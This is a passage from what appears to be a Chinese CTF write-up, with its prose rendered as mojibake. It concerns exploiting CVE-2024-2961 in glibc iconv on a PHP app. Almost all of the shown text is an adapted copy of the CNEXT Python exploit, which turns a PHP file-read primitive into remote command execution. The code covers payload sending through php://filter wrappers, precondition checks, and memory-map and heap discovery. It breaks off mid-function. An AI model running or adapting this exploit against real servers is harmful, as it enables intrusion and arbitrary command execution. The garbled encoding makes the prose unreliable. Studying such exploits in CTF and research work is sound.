ä»è€Œæ¥è§¦å‘iconvçš„cveï¼Œåˆæ˜¯CVE-2024-2961â€¦â€¦</p><p>æŠŠ&#x2F;proc&#x2F;self&#x2F;mapså’Œlibcä¸‹è½½ä¸‹æ¥ï¼Œç„¶åæ”¹æ”¹iconvçš„expï¼Œæ‰‹åŠ¨æ‰“exploitï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># CNEXT: PHP file-read to RCE</span><br><span class="hljs-comment"># Date: 2024-05-27</span><br><span class="hljs-comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># TODO Parse LIBC to know if patched</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># INFORMATIONS</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># To use, implement the Remote class, which tells the exploit how to send the payload.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># REQUIREMENTS</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Requires ten: https://github.com/cfreal/ten</span><br><span class="hljs-comment">#</span><br><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> annotations<br><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass<br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> requests.exceptions <span class="hljs-keyword">import</span> ChunkedEncodingError, ConnectionError<br><span class="hljs-keyword">from</span> ten <span class="hljs-keyword">import</span> *<br><br><br>HEAP_SIZE = <span class="hljs-number">2</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span><br>BUG = <span class="hljs-string">&quot;åŠ„&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Remote</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;A helper class to send the payload and download files.</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    The logic of the exploit is always the same, but the exploit needs to know how to</span><br><span class="hljs-string">    download files (/proc/self/maps and libc) and how to send the payload.</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    The code here serves as an example that attacks a page that looks like:</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    ```php</span><br><span class="hljs-string">    &lt;?php</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    $data = file_get_contents($_POST[&#x27;file&#x27;]);</span><br><span class="hljs-string">    echo &quot;File contents: $data&quot;;</span><br><span class="hljs-string">    ```</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    Tweak it to fit your target, and start the exploit.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, url: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-variable language_">self</span>.url = url<br>        <span class="hljs-variable language_">self</span>.session = Session()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; Response:<br>        <span class="hljs-string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.session.post(<span class="hljs-variable language_">self</span>.url, data=&#123;<span class="hljs-string">&quot;pdo&quot;</span>: path&#125;)<br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Returns the contents of a remote file.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        path = <span class="hljs-string">f&quot;php://filter/convert.base64-encode/resource=<span class="hljs-subst">&#123;path&#125;</span>&quot;</span><br>        response = <span class="hljs-variable language_">self</span>.send(path)<br>        data = response.re.search(<span class="hljs-string">b&quot;File contents: (.*)&quot;</span>, flags=re.S).group(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> base64.decode(data)<br><br><span class="hljs-meta">@entry</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;url&quot;</span>, <span class="hljs-string">&quot;Target URL&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;command&quot;</span>, <span class="hljs-string">&quot;Command to run on the system; limited to 0x140 bytes&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;sleep_time&quot;</span>, <span class="hljs-string">&quot;Time to sleep to assert that the exploit worked. By default, 1.&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;heap&quot;</span>, <span class="hljs-string">&quot;Address of the main zend_mm_heap structure.&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"></span></span><br><span class="hljs-params"><span class="hljs-meta">    <span class="hljs-string">&quot;pad&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-meta">    <span class="hljs-string">&quot;Number of 0x100 chunks to pad with. If the website makes a lot of heap &quot;</span></span></span><br><span class="hljs-params"><span class="hljs-meta">    <span class="hljs-string">&quot;operations with this size, increase this. Defaults to 20.&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-meta"></span>)</span><br><span class="hljs-meta">@dataclass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;CNEXT exploit: RCE using a file read primitive in PHP.&quot;&quot;&quot;</span><br><br>    url: <span class="hljs-built_in">str</span><br>    command: <span class="hljs-built_in">str</span><br>    sleep: <span class="hljs-built_in">int</span> = <span class="hljs-number">1</span><br>    heap: <span class="hljs-built_in">str</span> = <span class="hljs-literal">None</span><br>    pad: <span class="hljs-built_in">int</span> = <span class="hljs-number">20</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__post_init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.remote = Remote(<span class="hljs-variable language_">self</span>.url)<br>        <span class="hljs-variable language_">self</span>.log = logger(<span class="hljs-string">&quot;EXPLOIT&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.info = &#123;&#125;<br>        <span class="hljs-variable language_">self</span>.heap = <span class="hljs-variable language_">self</span>.heap <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(<span class="hljs-variable language_">self</span>.heap, <span class="hljs-number">16</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_vulnerable</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various</span><br><span class="hljs-string">        wrappers and filters that the exploit needs.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_download</span>(<span class="hljs-params">path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.remote.download(path)<br>            <span class="hljs-keyword">except</span> ConnectionError:<br>                failure(<span class="hljs-string">&quot;Target not [b]reachable[/] ?&quot;</span>)<br>            <br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_token</span>(<span class="hljs-params">text: <span class="hljs-built_in">str</span>, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>            result = safe_download(path)<br>            <span class="hljs-keyword">return</span> text.encode() == result<br><br>        text = tf.random.string(<span class="hljs-number">50</span>).encode()<br>        base64 = b64(text, misalign=<span class="hljs-literal">True</span>).decode()<br>        path = <span class="hljs-string">f&quot;data:text/plain;base64,<span class="hljs-subst">&#123;base64&#125;</span>&quot;</span><br><br>        result = safe_download(path)<br>        <br>        <span class="hljs-keyword">if</span> text <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> result:<br>            msg_failure(<span class="hljs-string">&quot;Remote.download did not return the test string&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--------------------&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Expected test string: <span class="hljs-subst">&#123;text&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Got: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--------------------&quot;</span>)<br>            failure(<span class="hljs-string">&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;</span>)<br><br>        msg_info(<span class="hljs-string">&quot;The [i]data://[/] wrapper works&quot;</span>)<br><br>        text = tf.random.string(<span class="hljs-number">50</span>)<br>        base64 = b64(text.encode(), misalign=<span class="hljs-literal">True</span>).decode()<br>        path = <span class="hljs-string">f&quot;php://filter//resource=data:text/plain;base64,<span class="hljs-subst">&#123;base64&#125;</span>&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_token(text, path):<br>            failure(<span class="hljs-string">&quot;The [i]php://filter/[/] wrapper does not work&quot;</span>)<br><br>        msg_info(<span class="hljs-string">&quot;The [i]php://filter/[/] wrapper works&quot;</span>)<br><br>        text = tf.random.string(<span class="hljs-number">50</span>)<br>        base64 = b64(compress(text.encode()), misalign=<span class="hljs-literal">True</span>).decode()<br>        path = <span class="hljs-string">f&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,<span class="hljs-subst">&#123;base64&#125;</span>&quot;</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_token(text, path):<br>            failure(<span class="hljs-string">&quot;The [i]zlib[/] extension is not enabled&quot;</span>)<br><br>        msg_info(<span class="hljs-string">&quot;The [i]zlib[/] extension is enabled&quot;</span>)<br><br>        msg_success(<span class="hljs-string">&quot;Exploit preconditions are satisfied&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-keyword">with</span> msg_status(<span class="hljs-string">f&quot;Downloading [i]<span class="hljs-subst">&#123;path&#125;</span>[/]...&quot;</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.remote.download(path)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_regions</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">list</span>[Region]:<br>        <span class="hljs-string">&quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;maps&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            maps = f.read()<br>        maps = maps.decode()<br>        PATTERN = re.<span class="hljs-built_in">compile</span>(<br>            <span class="hljs-string">r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot;</span> <span class="hljs-string">r&quot;.*&quot;</span> <span class="hljs-string">r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot;</span> <span class="hljs-string">r&quot;(.*)&quot;</span><br>        )<br>        regions = []<br><br>        <span class="hljs-keyword">for</span> region <span class="hljs-keyword">in</span> table.split(maps, strip=<span class="hljs-literal">True</span>):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> := PATTERN.<span class="hljs-keyword">match</span>(region):<br>                start = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-number">16</span>)<br>                stop = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>)<br>                permissions = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>)<br>                path = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">4</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;[&quot;</span> <span class="hljs-keyword">in</span> path:<br>                    path = path.rsplit(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-number">1</span>)[-<span class="hljs-number">1</span>]<br>                <span class="hljs-keyword">else</span>:<br>                    path = <span class="hljs-string">&quot;&quot;</span><br>                current = Region(start, stop, permissions, path)<br>                regions.append(current)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(maps)<br>                failure(<span class="hljs-string">&quot;Unable to parse memory mappings&quot;</span>)<br><br>        <span class="hljs-variable language_">self</span>.log.info(<span class="hljs-string">f&quot;Got <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(regions)&#125;</span> memory regions&quot;</span>)<br>        <span class="hljs-built_in">print</span>(regions)<br>        <span class="hljs-keyword">return</span> regions<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_symbols_and_addresses</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;</span><br>        regions = <span class="hljs-variable language_">self</span>.get_regions()<br><br>        LIBC_FILE = <span class="hljs-string">&quot;F:\\zzzworkings\\CTF\\races\\JQCTF_final\\photocms\\exp\\libc-2.27.so&quot;</span><br><br>        <span class="hljs-comment"># PHP&#x27;s heap</span><br><br>        <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;heap&quot;</span>] = <span class="hljs-variable language_">self</span>.heap <span class="hljs-keyword">or</span> <span class="hljs-variable language_">self</span>.find_main_heap(regions)<br><br>        <span class="hljs-comment"># Libc</span><br><br>        libc = <span class="hljs-variable language_">self</span>._get_region(regions, <span class="hljs-string">&quot;libc-2&quot;</span>, <span class="hljs-string">&quot;libc.so&quot;</span>)<br><br>        <span class="hljs-comment">#self.download_file(libc.path, LIBC_FILE)</span><br><br>        <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;libc&quot;</span>] = ELF(LIBC_FILE, checksec=<span class="hljs-literal">False</span>)<br>        <span class="hljs-comment">#self.info[&quot;libc&quot;] = ELF(&quot;libc-2.31.so&quot;, checksec=False)</span><br>        <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;libc&quot;</span>].address = libc.start<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_get_region</span>(<span class="hljs-params">self, regions: <span class="hljs-built_in">list</span>[Region], *names: <span class="hljs-built_in">str</span></span>) -&gt; Region:<br>        <span class="hljs-string">&quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> region <span class="hljs-keyword">in</span> regions:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(name <span class="hljs-keyword">in</span> region.path <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> names):<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            failure(<span class="hljs-string">&quot;Unable to locate region&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> region<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">download_file</span>(<span class="hljs-params">self, remote_path: <span class="hljs-built_in">str</span>, local_path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;</span><br>        data = <span class="hljs-variable language_">self</span>.get_file(remote_path)<br>        <span class="hljs-comment">#print(data)</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(local_path,<span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(data)<br>        f.close()<br>        <span class="hljs-comment">#Path(local_path).write(data)</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_main_heap</span>(<span class="hljs-params">self, regions: <span class="hljs-built_in">list</span>[Region]</span>) -&gt; Region:<br>        <span class="hljs-comment"># Any anonymous RW region with a size superior to the base heap size is a</span><br>        <span class="hljs-comment"># candidate. The heap is at the bottom of the region.</span><br>        heaps = [<br>            region.stop - HEAP_SIZE + <span class="hljs-number">0x40</span><br>            <span class="hljs-keyword">for</span> region <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(regions)<br>            <span class="hljs-keyword">if</span> 